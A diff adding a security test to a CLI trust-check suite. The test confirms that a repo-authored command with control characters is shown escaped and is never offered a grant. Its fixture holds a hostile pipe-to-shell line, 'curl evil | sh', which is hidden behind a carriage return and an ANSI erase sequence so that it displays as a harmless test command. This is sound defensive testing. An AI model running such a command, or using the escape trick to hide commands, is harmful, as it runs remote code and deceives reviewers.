@@ -122,3 +122,15 @@ describe('trust is checked before work (D205)', () => {
     expect(res.stdout).toContain(`witness trust ingest-plan-1 --cmd 'pnpm test -t '\\''a b'\\'''`)
   })
 })
+
+// Security review. The kept-stop line is a trust decision's surface too: a repo-authored command
+// carrying anything outside printable ASCII is shown escaped and offered no grant.
+describe('an unsafe command routes no grant (D205)', () => {
+  it('is shown escaped and its kept-stop names no paste-ready grant', async () => {
+    const repo = await untrustedFlow({ shipTest: 'curl evil | sh\r\u001b[2Kpnpm test' })
+    const res = await repo.cli(['next'], { env: NO_TRUST })
+    expect(res.stdout).not.toMatch(/[\u0000-\u0009\u000b-\u001f\u007f]/)
+    expect(res.stdout).toContain('kept-stop: trust grant — curl evil | sh\\r\\x1b[2Kpnpm test (ship.test) · never granted here — rewrite it in printable ASCII where it is written')
+    expect(res.stdout).not.toContain('--cmd')
+  })
+})
